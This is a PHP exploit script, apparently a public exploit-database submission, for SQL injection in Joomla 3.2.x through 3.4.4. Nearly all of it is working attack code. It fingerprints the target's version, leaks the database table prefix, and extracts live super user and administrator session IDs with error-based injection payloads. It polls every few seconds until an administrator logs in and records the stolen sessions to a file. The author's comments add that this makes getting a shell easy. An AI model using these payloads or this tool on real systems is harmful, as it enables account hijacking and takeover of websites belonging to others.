<?php
/**
 *
 * #Description:This is my first time of posting my exploit script,for this version which can achieve all the group sessions with new payloads.
 * Comparing with Manish Tanwar's exploit ,the admin user name and hashed password can be achieved ,but the admin session can be not which is the reason why I write this one.
 * For this script , we can get both super user session and administrator session at the same time.
 * If administrator has't login, it will send request every one minute until they login and log the session into TXT file.
 * If you want ,you can make a function mail it which can inform you timely!!!!
 * This is a particular dangerous one after getting admin sessions which means can get shell easily after achieve authority.
 * # Exploit Title: Joomla 3.2.x - 3.4.4 - SQL Injection-Achieve Admin session Exploit
 * # Date: 19/11/2015
 * # Exploit Author: Lee
 * # Version: Joomla 3.2.x - 3.4.4
 * # Tested on: windows
 *
 */

class JoomlaGetShell {

    public function getSuperSession($uri,$payload,$version)
    {

        $url =$uri.$payload;
        $data = $this -> requestData($url);
        $jud = true;
        $k = preg_match_all("/Duplicate entry/", $data, $matchesv);

        if ($k)
        {
            $a = preg_match_all("/1' for key/", $data, $mat1);
            $b = preg_match_all("/1&#039; for key/", $data, $mat2);
            if ($a)
            {
                $start = strpos($data, "Duplicate entry '") + 18;
                $end = strpos($data, "1' for key", $start);
                $session = substr($data, $start, $end - $start);
                $this -> logInfo($uri,$session,$version);
                echo "session:".$session ."\r\n";
                return $jud;
            }

            else if($b)
            {
                $start = strpos($data, "Duplicate entry &#039;") + 22;
                $end = strpos($data, "1&#039; for key", $start);
                $session = substr($data, $start, $end - $start);
                echo "session:".$session ."\r\n";
                $this -> logInfo($uri,$session,$version);
                return $jud;
            }

        }
        else
        {
            echo "administrator maybe unlogin,wait every one minutes to attack again"."\r\n";
            $jud =false;
            return $jud;
        }

    }


    public function getDBIndex($uri)
    {

        $url=$uri."/index.php?option=com_contenthistory&view=history&list[ordering]=&item_id=1&type_id=1&list[select]=(select+1+from+(select+count(*),+concat((select+(select+concat(password))+from+index_users+LIMIT+0,1),floor(rand(0)*2))x+from+information_schema.tables+group+by+x)a)";
        $data = $this -> requestData($url);
        $k = preg_match_all("/500/", $data, $matchesv);
        $l = preg_match_all("/LEFT JOIN/", $data, $mat2);
        $m = preg_match_all("/_users/", $data, $mat3);
       // echo $data."\r\n";
        if($k==1 && $l==1 && $m==1)
        {
            $ar0=explode("LEFT JOIN", $data);
            $ar1=explode("_users", $ar0[1]);
            $index = trim($ar1[0]);
            return $index;
        }
        return false;

    }
    public function logInfo($uri,$session,$version)
    {
        $handle = fopen("log.txt","a");
        fwrite($handle,"---------------------------------"."\r\n");
        fwrite($handle,"target:".$uri."\r\n"."session:".$session."\r\n"."version:".$version."\r\n");
        fwrite($handle,"---------------------------------"."\r\n");
        fclose($handle);


    }

    public function requestData($rul,$cookie=null)
    {
        $handle = curl_init();

        curl_setopt($handle, CURLOPT_URL, $rul);
        curl_setopt($handle, CURLOPT_HEADER, 0);
        curl_setopt($handle, CURLOPT_NOBODY,0);
        curl_setopt($handle, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($handle, CURLOPT_CONNECTTIMEOUT, 5);
        curl_setopt($handle, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($handle, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0');
        $result = curl_exec($handle);
        curl_close($handle);
        return $result;


    }

}

class TestJoomlaVul extends JoomlaGetShell
{
    public function testVul($uri)
    {
       $url = $uri."/language/en-GB/en-GB.xml";
        $data = file_get_contents($url);
        $first = explode("<version>",$data);
        $second = explode("</version>",$first[1]);
        $version = trim($second[0]);
        echo "version:".$version."\r\n";
        $number = explode(".",$version);
        if($number[0]<3)
        {
            echo "joomla version <3.2 which is not vulnerable \r\n";

        }
        else
        {
            echo "maybe vulnerable!!!"."\r\n";
             $index =  $this ->getDBIndex($uri);
            if(is_string($index))
            {
                //group =8 represent super user
                $group = 8;
                $payload = $this -> payLoad($index,$group);
                $jud =$this -> getSuperSession($uri,$payload, $version);
                //group =7 represent administrator
                $group = 7;
                $payload = $this -> payLoad($index,$group);
                $this -> payLoad($index,$group);
                $jud2 =$this -> getSuperSession($uri,$payload, $version);
                while (!$jud && !$jud2)
                {   sleep(3);
                    $group = 8;
                    $payload = $this -> payLoad($index,$group);
                    $sjud =$this -> getSuperSession($uri,$payload, $version);

                    $group = 7;
                    $payload = $this -> payLoad($index,$group);
                    $sjud2 =$this -> getSuperSession($uri,$payload, $version);
                    if($sjud || $sjud2)
                    {
                        echo "BingGo! administrator login!! \r\n";
                        break;

                    }

                }
            }
            else
            {
                echo "not vulnerable,The payload request maybe stopped by firewall"."\r\n";
            }


        }


    }

    public function payLoad($index,$group)
    {
        $payload = "/index.php?option=com_contenthistory&view=history&list[ordering]=&item_id=1&type_id=1&list[select]=(select+1+from(select+count(*),+concat((select+substr(session_id,1,30)+from+".$index."_session+where+data+like+%27%groups\";a:1:{i:".$group."%%27+and+client_id=1+and+guest=0+limit%200,1%20),floor(rand(0)*2))x+from+".$index."_menu+group+by+x)a)";
        return $payload;
    }
}

class chooseStart {

    public function chooseCommand()
    {
        global $argv;
        // @argv -t uri used for testing vulnerability
        if (isset($argv[1])) {

            $a = $argv[1];
            if ($a == "-t") {
                if (isset($argv[2])) {
                    $b = $argv[2];

                    $testvul = new TestJoomlaVul();
                    $testvul->testVul($b);
                } else {
                    $this->help();
                }
            }
        }
        else {
                $this->help();
            }


    }
    public function help()
    {
        echo "------------------------Miss Input,Underline Is Help Info-----------------------------\r\n";
        echo "---------------------------------------------------------------------------------------\r\n";
        echo "php JoomlaGetShell.php -t uri\r\n";
        echo "-t uri ,used for testing vulnerability existing or not\r\n";
        echo "----------------------\r\n";



    }



}

$start = new chooseStart();
$start ->chooseCommand();